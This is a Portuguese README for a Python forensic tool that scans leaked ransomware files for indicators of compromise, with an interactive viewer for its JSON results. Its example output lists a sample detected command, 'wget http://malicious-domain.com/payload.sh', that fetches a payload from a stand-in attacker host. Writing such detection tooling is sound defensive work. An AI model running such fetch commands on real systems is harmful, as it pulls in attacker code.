# IOC Searcher

Ferramenta Python para realizar buscas de **Indicators of Compromise (IOCs)** em arquivos vazados de ataques de ransomware.

## Funcionalidades

O script busca automaticamente por:

- **IPs**: Endereços IPv4 e IPv6
- **Domínios**: Nomes de domínio suspeitos
- **URLs**: Links HTTP/HTTPS
- **Comandos**: Comandos suspeitos executados (wget, curl, powershell, etc.)
- **Senhas**: Credenciais e tokens encontrados em arquivos de configuração
- **Softwares**: Menções a ferramentas de ransomware e malware

## Requisitos

- Python 3.7 ou superior
- Dependências listadas em `requirements.txt`
- Para melhor experiência no Windows: colorama (incluído automaticamente)

## Instalação

1. Clone ou baixe este repositório
2. Instale as dependências:

```bash
pip install -r requirements.txt
```

## Uso

### Uso Básico

```bash
python ioc_searcher.py <diretório>
```

Exemplo:
```bash
python ioc_searcher.py /caminho/para/analisar
```

### Opções

- `--output` ou `-o`: Exporta os resultados para um arquivo JSON
  ```bash
  python ioc_searcher.py /dados/ransomware --output relatorio.json
  ```

- `--json-only`: Apenas exporta para JSON, sem imprimir no console
  ```bash
  python ioc_searcher.py /logs/suspeitos --json-only --output relatorio.json
  ```

- `--threads` ou `-t`: Define o número de threads para processamento paralelo
  ```bash
  python ioc_searcher.py /caminho/para/analisar --threads 8
  python ioc_searcher.py /dados/ransomware --output relatorio.json --threads 2
  ```

## Tipos de Arquivos Processados

O script processa **apenas arquivos de texto**, identificados por:

- **Extensões de texto conhecidas**: `.txt`, `.log`, `.conf`, `.config`, `.ini`, `.json`, `.xml`, `.yaml`, `.yml`, `.sh`, `.bat`, `.cmd`, `.ps1`, `.py`, `.js`, `.html`, `.sql`, `.csv`, `.md`
- **Arquivos de log**: `messages`, `audit`, `syslog`, `auth.log`, `secure`, `access.log`, `error.log`, `evtx`, `eventlog`
- **Históricos de comandos**: `.history`, `.bash_history`, `.zsh_history`
- **Validação de conteúdo**: Arquivos sem extensão conhecida são verificados para confirmar se contêm texto legível

**Arquivos ignorados:**
- Arquivos binários (`.exe`, `.dll`, `.zip`, `.pdf`, `.jpg`, etc.)
- Arquivos com conteúdo binário detectado
- Arquivos que não podem ser decodificados como texto UTF-8/Latin-1

## Processamento Multi-thread

O script utiliza processamento **multi-thread** para analisar múltiplos arquivos simultaneamente, melhorando significativamente a performance em diretórios com muitos arquivos.

- **Threads padrão**: 4 threads simultâneas
- **Configurável**: Use `--threads N` para ajustar o número de threads
- **Thread-safe**: Resultados são protegidos por locks para evitar condições de corrida
- **Compatível**: Funciona tanto em Windows quanto Linux/Unix

**Exemplo com 8 threads:**
```bash
python ioc_searcher.py /dados/ransomware --threads 8
```

## Monitoramento de Progresso

O script mostra em tempo real o arquivo sendo processado na mesma linha (sem criar novas linhas), facilitando o acompanhamento do progresso especialmente em diretórios com milhares de arquivos.

**Exemplo de saída com múltiplas threads:**
```
[*] Total de arquivos a processar: 10753
[*] Progresso: 14/10753 arquivos processados
[Thread 1] Processando: pasta1\arquivo1.txt
[Thread 2] Processando: pasta2\arquivo2.txt
[Thread 3] Aguardando...
[Thread 4] Aguardando...
[Thread 5] Processando: pasta5\arquivo5.txt
[Thread 6] Processando: pasta6\arquivo6.txt
[Thread 7] Aguardando...
[Thread 8] Aguardando...
```

- **Contador total**: Mostra progresso geral `X/Y arquivos processados`
- **Threads ativas**: Lista cada thread com o arquivo que está processando
- **Linhas fixas por thread**: Cada thread tem sua própria linha dedicada
- **Status claro**: "Processando: arquivo.ext" ou "Aguardando..."
- **Visão simultânea**: Todas as threads são mostradas ao mesmo tempo
- **Compatibilidade**: Funciona em Windows e Linux/Unix

## Interrupção Graciosa

O script suporta interrupção graciosa com **Ctrl+C**:

- **Windows/Linux/macOS**: Pressione `Ctrl+C` para interromper o processamento
- **Encerramento limpo**: Cancela tarefas pendentes e salva resultados parciais
- **Thread-safe**: Interrupção funciona mesmo com múltiplas threads ativas
- **Arquivos grandes**: Interrupção funciona mesmo durante processamento de arquivos grandes

**Exemplo de interrupção:**
```
[*] Progresso: 1500/10753 arquivos processados
[Thread 1] Processando: pasta1\arquivo1.txt
[Thread 2] Processando: pasta2\arquivo2.txt
^C
[!] Recebido sinal de interrupção. Encerrando graciosamente...
[!] Interrupção solicitada. Cancelando tarefas restantes...
[*] Processamento concluído!
[*] Arquivos processados: 1500 (de 1500 analisados)
```

## Estrutura do Projeto

```
IOC-Search/
├── ioc_searcher.py      # Script principal para busca de IOCs
├── ioc_viewer.py        # Visualizador interativo de resultados JSON
├── ioc_detectors.py     # Módulo de detecção de IOCs
├── file_processor.py    # Módulo de processamento de arquivos
├── requirements.txt     # Dependências
└── README.md           # Este arquivo
```

## Exemplo de Saída

```
[*] Iniciando busca de IOCs em: ./ransomware_files
[*] Processando arquivos...

[*] Processamento concluído!
[*] Arquivos processados: 15
[*] Total de IOCs encontrados: 42

================================================================================
RESULTADOS DA BUSCA DE IOCs
================================================================================

[IPS]
--------------------------------------------------------------------------------

  192.168.1.100
  Arquivos (2):
    - ./ransomware_files/config.txt
    - ./ransomware_files/logs/access.log

[DOMAINS]
--------------------------------------------------------------------------------

  malicious-domain.com
  Arquivos (1):
    - ./ransomware_files/script.sh

[COMMANDS]
--------------------------------------------------------------------------------

  wget http://malicious-domain.com/payload.sh
  Arquivos (1):
    - ./ransomware_files/.bash_history

...
```

## Formato JSON de Saída

Quando exportado para JSON, os resultados seguem o formato:

```json
{
  "ips": {
    "192.168.1.100": [
      "./ransomware_files/config.txt",
      "./ransomware_files/logs/access.log"
    ]
  },
  "domains": {
    "malicious-domain.com": [
      "./ransomware_files/script.sh"
    ]
  },
  "commands": {
    "wget http://malicious-domain.com/payload.sh": [
      "./ransomware_files/.bash_history"
    ]
  },
  ...
}
```

## IOC Viewer

O `ioc_viewer.py` é uma ferramenta adicional que permite visualizar e filtrar os resultados JSON gerados pelo IOC Searcher de forma interativa e amigável.

### Funcionalidades do IOC Viewer

- **Interface Interativa**: Menu intuitivo para navegação dos resultados
- **Filtros por Tipo**: Visualize apenas IOCs de tipos específicos (ips, domains, urls, etc.)
- **Filtros por Caminho**: Encontre IOCs em arquivos específicos ou diretórios
- **Busca de Texto**: Procure IOCs que contenham termos específicos
- **Estatísticas**: Visualize estatísticas resumidas dos resultados
- **Modo Comando**: Use argumentos de linha de comando para automação

### Uso Básico

```bash
python ioc_viewer.py relatorio.json
```

### Modo Interativo

```bash
python ioc_viewer.py relatorio.json --interactive
```

O modo interativo oferece um menu com as seguintes opções:
1. Ver todos os resultados
2. Filtrar por tipo de IOC
3. Filtrar por caminho/arquivo
4. Buscar IOC específico
5. Ver estatísticas
6. Sair

### Opções de Linha de Comando

- `--stats`, `-s`: Mostra apenas estatísticas gerais
- `--filter-type`: Filtra por tipos específicos (ex: `ips,domains`)
- `--filter-path`: Filtra por padrão de caminho/arquivo
- `--search`: Busca IOCs contendo o termo especificado
- `--no-files`: Não mostra lista de arquivos nos resultados
- `--table`, `-t`: Mostra resultados em formato de tabela (IOC único por linha)
- `--table-detailed`: Mostra tabela detalhada (uma linha por IOC-arquivo)
- `--interactive`, `-i`: Ativa o modo interativo

### Exemplos de Uso

```bash
# Ver apenas estatísticas
python ioc_viewer.py relatorio.json --stats

# Filtrar apenas IPs e domínios
python ioc_viewer.py relatorio.json --filter-type ips,domains

# Buscar IOCs relacionados a um domínio específico
python ioc_viewer.py relatorio.json --search malicious-domain.com

# Filtrar IOCs em arquivos de configuração
python ioc_viewer.py relatorio.json --filter-path config

# Visualizar em formato de tabela
python ioc_viewer.py relatorio.json --table

# Tabela detalhada (uma linha por IOC-arquivo)
python ioc_viewer.py relatorio.json --table-detailed

# Combinar filtros com tabela
python ioc_viewer.py relatorio.json --filter-type ips,domains --table

# Modo interativo
python ioc_viewer.py relatorio.json --interactive
```

### Exemplo de Saída

```
================================================================================
IOC VIEWER - MENU PRINCIPAL
================================================================================
1. Ver todos os resultados
2. Filtrar por tipo de IOC
3. Filtrar por caminho/arquivo
4. Buscar IOC específico
5. Ver estatísticas
6. Ver resultados em tabela
7. Sair

Escolha uma opção (1-7): 5

================================================================================
ESTATÍSTICAS GERAIS
================================================================================
Total de IOCs encontrados: 42
Total de arquivos afetados: 15
Tipos de IOC detectados: 6

Distribuição por tipo:
  ips: 8 IOCs em 5 arquivos
  domains: 12 IOCs em 8 arquivos
  urls: 5 IOCs em 3 arquivos
  commands: 10 IOCs em 4 arquivos
  passwords: 3 IOCs em 2 arquivos
  software: 4 IOCs em 6 arquivos
```

### Exemplo de Saída em Tabela

```
================================================================================
TABELA DE IOCs
================================================================================
+-----------------------------+---------+------------+
| IOC                         | TIPO    | CONTAGEM   |
+=============================+=========+============+
| 192.168.1.100              | IPS     | 2 arquivos |
+-----------------------------+---------+------------+
| malicious-domain.com        | DOMAINS | 3 arquivos |
+-----------------------------+---------+------------+
| wget http://...            | COMMANDS| 1 arquivo  |
+-----------------------------+---------+------------+

Total de IOCs únicos: 3
Total de entradas na tabela: 3
```

## Notas de Segurança

⚠️ **ATENÇÃO**: Esta ferramenta é destinada apenas para fins de análise forense e pesquisa de segurança. 

- Não execute em sistemas de produção sem autorização
- Os arquivos analisados podem conter conteúdo malicioso
- Sempre use em ambientes isolados (VMs, containers)
- Revise cuidadosamente os resultados antes de tomar ações baseadas neles

## Limitações

- Arquivos binários não são processados (apenas texto)
- Arquivos maiores que 50MB são processados parcialmente (amostra)
- Alguns IOCs podem gerar falsos positivos
- A detecção de senhas pode capturar valores que não são realmente senhas

## Contribuindo

Sugestões e melhorias são bem-vindas! Sinta-se à vontade para abrir issues ou pull requests.

## Licença

Este projeto é fornecido "como está" para fins educacionais e de pesquisa.

